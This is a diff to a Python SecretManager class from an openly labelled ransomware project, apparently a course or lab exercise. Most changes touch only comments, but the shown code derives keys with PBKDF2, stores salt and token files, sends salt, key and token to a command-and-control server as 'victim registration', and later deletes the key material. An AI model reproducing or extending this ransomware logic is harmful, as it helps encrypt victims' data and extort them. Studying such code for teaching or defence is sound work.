@@ -34,7 +34,7 @@ class SecretManager:
         self._log = logging.getLogger(self.__class__.__name__)
 
     def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        # PBKDF2HMAC algorithm
+        # PBKDF2HMAC derivation algorithm
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=TOKEN_LENGTH,
@@ -80,10 +80,10 @@ class SecretManager:
 
 
     def setup(self)->None:
-        # main function to create crypto data and register malware to cnc # CREATE Function ??????????
+        # main function to create crypto data and register malware to cnc
         self.create()
         
-        # do not create token.bin and slat.bin if it's already existing -> return
+        # do not create token.bin and slat.bin if it's already existing => return
         if os.path.exists(self._path+'/token.bin'):
             # keeps the same secrets if the ransomware restarts
             self.load()
@@ -96,6 +96,7 @@ class SecretManager:
         with open(self._path+'/token.bin', 'wb') as token:
             token.write(self._token)
 
+        # victim registration
         self.post_new(self._salt, self._key, self._token)
 
         print("#setup:")
@@ -104,7 +105,7 @@ class SecretManager:
 
 
     def load(self)->None:
-        # function to load crypto data
+        # function to load crypto data salt & token
         with open(self._path+'/salt.bin', 'rb') as salt:
             self._salt = salt.read(SALT_LENGTH)
         
@@ -154,7 +155,7 @@ class SecretManager:
 
 
     def clean(self)->None:
-        # remove crypto data from the target
+        # try removing crypto data from the target
         try:
             os.remove(self._path+'/salt.bin')
             print(f"The salt.bin has been deleted.")
